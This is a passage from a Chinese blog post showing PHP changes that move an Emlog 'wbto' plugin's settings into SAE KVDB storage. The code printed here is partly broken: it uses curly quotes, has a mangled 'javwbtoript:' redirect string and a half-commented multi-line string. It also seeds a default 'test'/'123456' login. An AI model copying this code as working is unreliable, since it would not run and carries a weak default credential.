    $ret4 = $kv-&gt;add(’WBTO_USER_NAME’,’test’);
    $ret5 = $kv-&gt;add(’WBTO_USER_PASSWD’,’123456’);
    $ret6 = $kv-&gt;add(’WBTO_SYNC’,’1’);
    $ret7 = $kv-&gt;add(’WBTO_TFROM’,’5’);
    if($ret !== true &amp;&amp; $ret1 !== true &amp;&amp; $ret2 !== true &amp;&amp; $ret3 !== true &amp;&amp; $ret4 !== true &amp;&amp; $ret5 !== true &amp;&amp; $ret6 !== true &amp;&amp; $ret7 !== true)
    {
        wbtoMsg("安装失败!");
    }
}
function wbto_uninstall()
{
    $kv = wbto_init_kvdb();
    $ret = $kv-&gt;delete(’WBTO_API_KEY’);
    $ret1 = $kv-&gt;delete(’WBTO_API_DOMAIN’);
    $ret2 = $kv-&gt;delete(’WBTO_API_POST_PATH’);
    $ret3 = $kv-&gt;delete(’WBTO_API_POST_IMAGE_PATH’);
    $ret4 = $kv-&gt;delete(’WBTO_USER_NAME’);
    $ret5 = $kv-&gt;delete(’WBTO_USER_PASSWD’);
    $ret6 = $kv-&gt;delete(’WBTO_SYNC’);
    $ret7 = $kv-&gt;delete(’WBTO_TFROM’);
    if($ret !== true &amp;&amp; $ret1 !== true &amp;&amp; $ret2 !== true &amp;&amp; $ret3 !== true &amp;&amp; $ret4 !== true &amp;&amp; $ret5 !== true &amp;&amp; $ret6 !== true &amp;&amp; $ret7 !== true)
    {
        wbtoMsg("卸载失败!");
    }
}
function wbto_init_kvdb()
{
    $kv = new SaeKV();
    // 初始化KV对象
    $ret = $kv-&gt;init();
    if($ret==true)
    {
        return $kv;
    }
    else
    {
        wbtoMsg("初始化KV对象失败,请检查是否开启KVDB服务!");
    }
}
function wbtoMsg($msg, $url = ’javwbtoript:history.back(-1);’) {
    if(isset($_GET[’gid’])) {
        define (’TEMPLATE_PATH’, EMLOG_ROOT . ’/m/view/’);
        $url = BLOG_URL . ’m/?post=’. intval($_GET[’gid’]);
        include View::getView(’header’);
        include View::getView(’msg’);
        include View::getView(’footer’);
        View::output();
        exit;
    } else {
        emMsg($msg,$url);
    }
}
// init kvdb at 12:31 2013-2-6    end
?&gt;</pre>

<p>&nbsp;</p>
<p>3.增加初始化文件wbto_callback.php</p>
<p>&nbsp; &nbsp; 文件中主要是安装和卸载插件时候需要初始化和卸载的一些数据，代码如下：</p>
<pre class="brush:php; toolbar: true; auto-links: true;">    &lt;?php
// init kvdb at 12:31 2013-2-6 by L.N. begin
if(!defined(’EMLOG_ROOT’)) {exit(’error!’);}
require_once EMLOG_ROOT.’/content/plugins/wbto/wbto.php’;
function callback_init()
{
    wbto_install();
}
function callback_rm()
{
    wbto_uninstall();
}
?&gt;</pre>

<p>&nbsp;</p>
<p>4.修改wbto.php文件</p>
<p>&nbsp; &nbsp; 在其开头增加如下代码：</p>
<pre class="brush:php; toolbar: true; auto-links: true;">!defined(’EMLOG_ROOT’) &amp;&amp; exit(’access deined!’);
/&#42 by L.N.
require_once ’wbto_profile.php’;
require_once ’wbto_config.php’;
&#42/
require_once ’wbto_kvdb.php’;
define(’WBTO_API_KEY’, wbto_read(’WBTO_API_KEY’));
define(’WBTO_API_DOMAIN’, wbto_read(’WBTO_API_DOMAIN’));
define(’WBTO_API_POST_PATH’, wbto_read(’WBTO_API_POST_PATH’));
define(’WBTO_API_POST_IMAGE_PATH’, wbto_read(’WBTO_API_POST_IMAGE_PATH’));
define(’WBTO_USER_NAME’, wbto_read(’WBTO_USER_NAME’));
define(’WBTO_USER_PASSWD’, wbto_read(’WBTO_USER_PASSWD’));
define(’WBTO_SYNC’, wbto_read(’WBTO_SYNC’));
define(’WBTO_TFROM’, wbto_read(’WBTO_TFROM’));</pre>

<p>&nbsp;</p>
<p>5.修改wbto_setting.php文件中的plugin_setting()函数</p>
<p>&nbsp; &nbsp; 代码如下：</p>
<pre class="brush:php; toolbar: true; auto-links: true;">function plugin_setting(){
    //$profile = EMLOG_ROOT.’/content/plugins/wbto/wbto_profile.php’;

    $wbto_user = htmlspecialchars($_POST[’user’], ENT_QUOTES);
    $wbto_pwd = htmlspecialchars($_POST[’pwd’], ENT_QUOTES);
    $wbto_sync = htmlspecialchars($_POST[’sync’], ENT_QUOTES);
    $wbto_tfrom = htmlspecialchars($_POST[’tfrom’], ENT_QUOTES);

    //$wbto_new_profile = "&lt;?php
define(’WBTO_USER_NAME’,’$wbto_user’);
define(’WBTO_USER_PASSWD’,’$wbto_pwd’);
define(’WBTO_SYNC’,’$wbto_sync’);
define(’WBTO_TFROM’,’$wbto_tfrom’);
";
    /&#42
    $fp = @fopen($profile,’wb’);
    if(!$fp) {
        return false;
    }
    fwrite($fp,$wbto_new_profile);
    fclose($fp);
    &#42/
    wbto_write($wbto_user, ’WBTO_USER_NAME’);
    wbto_write($wbto_pwd, ’WBTO_USER_PASSWD’);
    wbto_write($wbto_sync, ’WBTO_SYNC’);
    wbto_write($wbto_tfrom, ’WBTO_TFROM’);
}</pre>

<p>&nbsp;</p>
<p>以上就是我的相关修改，如果bug请留言。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">166</span>
                  <span class="site-state-item-name">Artikel</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">Kategorien</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">182</span>
                  <span class="site-state-item-name">Tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2011 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
